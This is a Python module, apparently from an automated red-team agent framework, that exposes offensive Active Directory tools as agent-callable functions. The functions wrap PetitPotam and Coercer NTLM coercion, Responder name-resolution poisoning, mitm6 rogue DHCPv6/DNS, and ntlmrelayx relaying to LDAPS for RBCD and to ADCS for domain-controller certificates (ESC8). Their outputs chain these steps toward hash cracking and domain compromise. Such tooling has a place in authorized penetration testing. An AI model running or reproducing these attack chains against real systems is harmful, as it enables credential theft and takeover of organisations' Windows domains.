"""Red Team authentication coercion tools.

This module provides toolsets for:
- PetitPotam, Coercer, and other coercion techniques
- Responder and mitm6 for capturing/relaying credentials
"""

import logging

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.tools.red.common import (
    AnyRedTeamState,
    run_tool,
)

logger = logging.getLogger(__name__)


class CoercionTools(Toolset):
    """Tools for coercing NTLM authentication from Windows machines.

    These tools trigger outbound authentication that can be captured
    or relayed to gain access to other services.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def petitpotam(
        self,
        target: str,
        listener: str,
        username: str = "",
        password: str = "",
        domain: str = "",
    ) -> str:
        """
        Coerce NTLM authentication using PetitPotam (MS-EFSRPC).

        PetitPotam forces a target to authenticate to your listener via EFSRPC.
        Works unauthenticated on many unpatched systems, or authenticated on patched ones.

        Use with ntlmrelayx to relay the authentication to LDAPS for RBCD/shadow creds.

        Args:
            target: Target machine IP to coerce
            listener: Your listener IP (where auth will be sent)
            username: Username for authenticated coercion (optional)
            password: Password for authentication (optional)
            domain: Domain for authentication (optional)

        Returns:
            PetitPotam coercion result

        Example:
            >>> petitpotam("192.168.58.10", "192.168.58.100")  # unauthenticated
            >>> petitpotam("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
        """
        # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
        # may not be installed. Coercer is more reliable and widely available.
        cmd = [
            "coercer",
            "coerce",
            "-t",
            target,
            "-l",
            listener,
            "--filter-protocol-name",
            "MS-EFSR",  # This is the PetitPotam protocol
        ]

        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])

        try:
            logger.info(f"[*] Running PetitPotam (via coercer MS-EFSR) against {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "worked" in result.lower() or "success" in result.lower():
                logger.info("[+] PetitPotam coercion successful!")
                result = (
                    "🚨 PETITPOTAM COERCION SUCCESSFUL!\n"
                    f"\u2192 Target {target} should authenticate to {listener}\n"
                    "\u2192 Check ntlmrelayx/Responder for captured auth\n\n" + result
                )

            return result

        except Exception as e:
            return f"PetitPotam (MS-EFSR coercion) failed: {e}"

    @dn.tool_method
    def coercer(
        self,
        target: str,
        listener: str,
        username: str = "",
        password: str = "",
        domain: str = "",
    ) -> str:
        """
        Coerce NTLM authentication using multiple methods (Coercer).

        Coercer is a comprehensive coercion tool that tries multiple RPC methods
        to force outbound authentication. More methods than PetitPotam alone.

        Args:
            target: Target machine IP to coerce
            listener: Your listener IP (where auth will be sent)
            username: Username for authentication (optional)
            password: Password for authentication (optional)
            domain: Domain for authentication (optional)

        Returns:
            Coercer results

        Example:
            >>> coercer("192.168.58.10", "192.168.58.100", "user", "pass", "domain.local")
        """
        cmd = ["coercer", "coerce", "-t", target, "-l", listener]

        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])

        try:
            logger.info(f"[*] Running Coercer against {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "worked" in result.lower():
                logger.info("[+] Coercer found working methods!")
                result = (
                    "🚨 COERCION METHODS FOUND!\n"
                    f"\u2192 Target {target} can be coerced to {listener}\n"
                    "\u2192 Use with ntlmrelayx for exploitation\n\n" + result
                )

            return result

        except Exception as e:
            return f"Coercer failed: {e}"


class CoercionNetworkTools(Toolset):
    """Tools for network-based authentication capture and relay.

    These tools passively or actively capture credentials on the network.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def start_responder(
        self,
        interface: str = "",
        analyze_mode: bool = False,
    ) -> str:
        """
        Start Responder to capture NTLM hashes from network traffic.

        Responder poisons LLMNR, NBT-NS, and MDNS to capture NTLM hashes
        from machines looking for network resources.

        Args:
            interface: Network interface to listen on (auto-detected if empty)
            analyze_mode: If True, only analyze without poisoning (safer)

        Returns:
            Responder status

        Example:
            >>> start_responder("ens5")
            >>> start_responder("ens5", analyze_mode=True)
        """
        from ares.core.config import get_default_network_interface

        if not interface:
            interface = get_default_network_interface()

        cmd = ["responder", "-I", interface]

        if analyze_mode:
            cmd.append("-A")

        try:
            logger.info(f"[*] Starting Responder on {interface}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📶 RESPONDER STARTED\n"
                f"\u2192 Listening on {interface}\n"
                "\u2192 Captured hashes will appear in logs\n"
                "\u2192 Use crack_with_hashcat on captured NTLMv2 hashes (mode 5600)\n\n" + result
            )

        except Exception as e:
            return f"Responder failed: {e}"

    @dn.tool_method
    def start_mitm6(
        self,
        domain: str,
        interface: str = "",
    ) -> str:
        """
        Start mitm6 for IPv6 DNS takeover attacks.

        mitm6 exploits the default IPv6 settings in Windows to become a
        rogue DHCPv6 server and DNS server, enabling credential theft.

        Use with ntlmrelayx for complete attack chain.

        Args:
            domain: Target domain for DNS takeover
            interface: Network interface to listen on (auto-detected if empty)

        Returns:
            mitm6 status

        Example:
            >>> start_mitm6("domain.local", "ens5")
        """
        from ares.core.config import get_default_network_interface

        if not interface:
            interface = get_default_network_interface()

        cmd = ["mitm6", "-d", domain, "-i", interface]

        try:
            logger.info(f"[*] Starting mitm6 for {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📶 MITM6 STARTED\n"
                f"\u2192 Rogue DHCPv6/DNS for {domain}\n"
                "\u2192 Run ntlmrelayx in parallel to relay captured auth\n\n" + result
            )

        except Exception as e:
            return f"mitm6 failed: {e}"

    @dn.tool_method
    def ntlmrelayx_to_ldaps(
        self,
        dc_ip: str,
        delegate_access: bool = True,
    ) -> str:
        """
        Start ntlmrelayx to relay NTLM auth to LDAPS for RBCD/shadow creds.

        Relays captured NTLM authentication to LDAPS for privilege escalation.
        With --delegate-access, creates machine account for RBCD attack.

        Combine with coercion tools (petitpotam, coercer) for full attack.

        Args:
            dc_ip: Domain controller IP to relay to
            delegate_access: Enable RBCD delegation attack (default: True)

        Returns:
            ntlmrelayx status

        Example:
            >>> ntlmrelayx_to_ldaps("192.168.58.10")
        """
        cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]

        if delegate_access:
            cmd.append("--delegate-access")

        try:
            logger.info(f"[*] Starting ntlmrelayx targeting LDAPS on {dc_ip}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📋 NTLMRELAYX STARTED\n"
                f"\u2192 Relaying to ldaps://{dc_ip}\n"
                "\u2192 Use petitpotam/coercer to trigger authentication\n"
                "\u2192 Machine account will be created for RBCD\n\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx failed: {e}"

    @dn.tool_method
    def ntlmrelayx_to_adcs(
        self,
        ca_host: str,
        template: str = "DomainController",
    ) -> str:
        """
        Start ntlmrelayx to relay to ADCS Web Enrollment (ESC8).

        Relays captured NTLM auth to the ADCS HTTP enrollment endpoint
        to request certificates as the relayed user/machine.

        Combine with coercion against a DC to get domain admin cert.

        Args:
            ca_host: Certificate Authority hostname/IP
            template: Certificate template to request (default: DomainController)

        Returns:
            ntlmrelayx status

        Example:
            >>> ntlmrelayx_to_adcs("CA01.domain.local", "DomainController")
        """
        cmd = [
            "ntlmrelayx.py",
            "-t",
            f"http://{ca_host}/certsrv/certfnsh.asp",
            "--adcs",
            "--template",
            template,
        ]

        try:
            logger.info(f"[*] Starting ntlmrelayx targeting ADCS on {ca_host}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📋 NTLMRELAYX TO ADCS STARTED\n"
                f"\u2192 Relaying to http://{ca_host}/certsrv/\n"
                f"\u2192 Template: {template}\n"
                "\u2192 Coerce a DC to get its certificate\n"
                "\u2192 Use certipy_auth with resulting .pfx\n\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx to ADCS failed: {e}"
